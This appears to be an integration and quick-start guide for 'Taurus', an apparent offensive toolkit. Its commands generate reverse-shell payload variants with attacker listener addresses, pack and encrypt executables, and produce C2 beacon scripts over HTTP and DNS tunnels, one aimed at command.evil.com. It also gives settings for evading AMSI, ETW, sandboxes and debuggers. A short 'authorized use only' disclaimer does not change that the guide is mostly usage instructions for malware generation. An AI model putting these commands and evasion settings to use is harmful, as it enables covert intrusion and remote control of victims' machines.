# Taurus - Integration Guide

## Integrating CLI Additions

The new CLI commands are in `cli_additions.py`. To integrate them into the main CLI:

### Option 1: Manual Integration (Recommended)

1. Open `cli.py`
2. Copy the imports from `cli_additions.py` (lines 1-10) to the imports section of `cli.py`
3. Copy each `@cli.command()` function from `cli_additions.py`
4. Paste them before the `if __name__ == "__main__":` line in `cli.py`

### Option 2: Import from Module

Add this to `cli.py` before the main block:

```python
# Import additional commands
try:
    from cli_additions import interactive, batch, pack, c2
except ImportError:
    pass
```

### Option 3: Use as Separate Script

Run commands directly:
```bash
python -c "from cli_additions import *; cli()"
```

## New Commands Available

Once integrated, you'll have:

```bash
# Interactive mode
python cli.py interactive

# Batch generation
python cli.py batch --type reverse_shell --lhost 192.168.1.10 --lport 4444 --count 5

# Pack payload
python cli.py pack --payload test.exe --output packed.exe

# Generate C2 template
python cli.py c2 --type http --server 192.168.1.100 --output c2.ps1
```

## Testing the Installation

### Test 1: Import All Modules

```python
# test_imports.py
print("Testing Taurus imports...")

try:
    from evasion.evasion_techniques import get_evasion_orchestrator
    print("✓ Evasion techniques module")
except Exception as e:
    print(f"✗ Evasion techniques: {e}")

try:
    from utils.payload_packer import get_packer
    print("✓ Payload packer module")
except Exception as e:
    print(f"✗ Payload packer: {e}")

try:
    from generators.c2_templates import get_c2_factory
    print("✓ C2 templates module")
except Exception as e:
    print(f"✗ C2 templates: {e}")

try:
    from obfuscation.obfuscator import get_obfuscator
    print("✓ Enhanced obfuscator")
except Exception as e:
    print(f"✗ Obfuscator: {e}")

print("\\nAll imports successful!")
```

Run with:
```bash
python test_imports.py
```

### Test 2: Basic Functionality

```python
# test_basic.py
from evasion.evasion_techniques import get_evasion_orchestrator
from utils.payload_packer import get_packer
from generators.c2_templates import get_c2_factory

# Test evasion
evasion = get_evasion_orchestrator()
test_payload = b"TEST_PAYLOAD_DATA"
evaded, meta = evasion.apply_all_evasions(test_payload, techniques=["amsi"])
print(f"✓ Evasion: {len(evaded)} bytes")

# Test packer
packer = get_packer()
packed, pack_meta = packer.pack_payload(test_payload, compression="zlib", encryption="xor")
print(f"✓ Packer: {len(packed)} bytes, ratio={pack_meta['compression_ratio']:.2%}")

# Test C2
c2_factory = get_c2_factory()
http_beacon = c2_factory.create_http_beacon("192.168.1.100", 443)
beacon_code = http_beacon.generate_beacon_code()
print(f"✓ C2 Template: {len(beacon_code)} bytes")

print("\\nAll tests passed!")
```

Run with:
```bash
python test_basic.py
```

## Quick Start Guide

### 1. Generate Your First Payload

```bash
# Use interactive mode for guided generation
python cli.py interactive
```

Follow the prompts to create a customized payload.

### 2. Run Advanced Example

```bash
# See all features in action
python examples/advanced_example.py
```

This will:
- Generate a payload
- Apply evasion techniques
- Obfuscate with all methods
- Create polymorphic variants
- Pack and encrypt
- Generate C2 template
- Evaluate and save results

### 3. Generate Batch Variants

```bash
# Create 5 unique variants
python cli.py batch \\
  --type reverse_shell \\
  --target windows \\
  --lhost 192.168.1.10 \\
  --lport 4444 \\
  --count 5 \\
  --output-dir my_variants/
```

### 4. Pack an Existing Payload

```bash
# Compress and encrypt
python cli.py pack \\
  --payload my_payload.exe \\
  --compression lzma \\
  --encryption aes \\
  --output packed_payload.exe
```

### 5. Generate C2 Infrastructure

```bash
# HTTP beacon
python cli.py c2 --type http --server 192.168.1.100 --port 443 --output http_beacon.ps1

# DNS tunnel
python cli.py c2 --type dns --server command.evil.com --output dns_tunnel.ps1
```

## Troubleshooting

### Issue: shimmy not installed
```bash
pip install 'shimmy>=2.0'
```

### Issue: rich not installed
```bash
pip install rich
```

### Issue: CUDA not available
Edit `config/settings.py`:
```python
ml_config.device = "cpu"
```

### Issue: Module not found
Make sure you're in the Taurus directory:
```bash
cd Taurus
python cli.py info
```

## Configuration Tips

### For Maximum Evasion

```python
# In your script or via CLI
obfuscation_level = 5
use_ml = True
use_evasion = True
techniques = ["amsi", "etw", "sandbox", "anti_debug"]
```

### For Maximum Compression

```bash
python cli.py pack --payload file.exe --compression lzma --encryption aes --output packed.exe
```

### For Stealth C2

Use DNS tunneling for maximum stealth:
```bash
python cli.py c2 --type dns --server your-domain.com --output stealth_c2.ps1
```

## Safety Reminders

⚠️ **IMPORTANT**: This tool is for authorized use only!

- Always get written permission before testing
- Only use in isolated lab environments
- Never use on production systems without authorization
- Respect all applicable laws and regulations
- Use for defense, not offense

## Next Steps

1. ✅ Install dependencies: `pip install -r requirements.txt`
2. ✅ Test imports: `python test_imports.py`
3. ✅ Run basic tests: `python test_basic.py`
4. ✅ Try interactive mode: `python cli.py interactive`
5. ✅ Run advanced example: `python examples/advanced_example.py`
6. ✅ Read enhanced README: `README_ENHANCED.md`
7. ✅ Customize for your needs

## Support

For questions or issues:
- Check `README_ENHANCED.md` for detailed documentation
- Review `examples/advanced_example.py` for usage patterns
- Consult `walkthrough.md` for implementation details

---

**Happy (Ethical) Hacking!** 🛡️
